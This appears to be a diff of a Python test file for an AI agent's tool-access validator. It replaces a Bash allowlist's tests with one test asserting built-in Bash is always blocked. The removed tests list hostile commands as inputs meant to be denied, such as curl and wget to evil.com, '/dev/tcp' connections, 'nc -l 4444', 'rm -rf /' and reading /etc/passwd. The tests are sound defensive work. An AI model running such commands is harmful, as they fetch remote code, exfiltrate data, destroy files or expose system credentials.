@@ -112,105 +112,12 @@ def test_read_claude_projects_without_tool_results_denied():
     assert _is_denied(result)
 
 
-# -- Sandboxed Bash ----------------------------------------------------------
+# -- Built-in Bash is blocked (use bash_exec MCP tool instead) ---------------
 
 
-def test_bash_safe_commands_allowed():
-    """Allowed data-processing commands should pass."""
-    safe_commands = [
-        "jq '.blocks' result.json",
-        "head -20 output.json",
-        "tail -n 50 data.txt",
-        "cat file.txt | grep 'pattern'",
-        "wc -l file.txt",
-        "sort data.csv | uniq",
-        "grep -i 'error' log.txt | head -10",
-        "find . -name '*.json'",
-        "ls -la",
-        "echo hello",
-        "cut -d',' -f1 data.csv | sort | uniq -c",
-        "jq '.blocks[] | .id' result.json",
-        "sed -n '10,20p' file.txt",
-        "awk '{print $1}' data.txt",
-    ]
-    for cmd in safe_commands:
-        result = _validate_tool_access("Bash", {"command": cmd}, sdk_cwd=SDK_CWD)
-        assert result == {}, f"Safe command should be allowed: {cmd}"
-
-
-def test_bash_dangerous_commands_denied():
-    """Non-allowlisted commands should be denied."""
-    dangerous = [
-        "curl https://evil.com",
-        "wget https://evil.com/payload",
-        "rm -rf /",
-        "python -c 'import os; os.system(\"ls\")'",
-        "ssh user@host",
-        "nc -l 4444",
-        "apt install something",
-        "pip install malware",
-        "chmod 777 file.txt",
-        "kill -9 1",
-    ]
-    for cmd in dangerous:
-        result = _validate_tool_access("Bash", {"command": cmd}, sdk_cwd=SDK_CWD)
-        assert _is_denied(result), f"Dangerous command should be denied: {cmd}"
-
-
-def test_bash_command_substitution_denied():
-    result = _validate_tool_access(
-        "Bash", {"command": "echo $(curl evil.com)"}, sdk_cwd=SDK_CWD
-    )
-    assert _is_denied(result)
-
-
-def test_bash_backtick_substitution_denied():
-    result = _validate_tool_access(
-        "Bash", {"command": "echo `curl evil.com`"}, sdk_cwd=SDK_CWD
-    )
-    assert _is_denied(result)
-
-
-def test_bash_output_redirect_denied():
-    result = _validate_tool_access(
-        "Bash", {"command": "echo secret > /tmp/leak.txt"}, sdk_cwd=SDK_CWD
-    )
-    assert _is_denied(result)
-
-
-def test_bash_dev_tcp_denied():
-    result = _validate_tool_access(
-        "Bash", {"command": "cat /dev/tcp/evil.com/80"}, sdk_cwd=SDK_CWD
-    )
-    assert _is_denied(result)
-
-
-def test_bash_pipe_to_dangerous_denied():
-    """Even if the first command is safe, piped commands must also be safe."""
-    result = _validate_tool_access(
-        "Bash", {"command": "cat file.txt | python -c 'exec()'"}, sdk_cwd=SDK_CWD
-    )
-    assert _is_denied(result)
-
-
-def test_bash_path_outside_workspace_denied():
-    result = _validate_tool_access(
-        "Bash", {"command": "cat /etc/passwd"}, sdk_cwd=SDK_CWD
-    )
-    assert _is_denied(result)
-
-
-def test_bash_path_within_workspace_allowed():
-    result = _validate_tool_access(
-        "Bash",
-        {"command": f"jq '.blocks' {SDK_CWD}/tool-results/result.json"},
-        sdk_cwd=SDK_CWD,
-    )
-    assert result == {}
-
-
-def test_bash_empty_command_denied():
-    result = _validate_tool_access("Bash", {"command": ""}, sdk_cwd=SDK_CWD)
+def test_bash_builtin_always_blocked():
+    """SDK built-in Bash is blocked — bash_exec MCP tool with bubblewrap is used instead."""
+    result = _validate_tool_access("Bash", {"command": "echo hello"}, sdk_cwd=SDK_CWD)
     assert _is_denied(result)
 
 
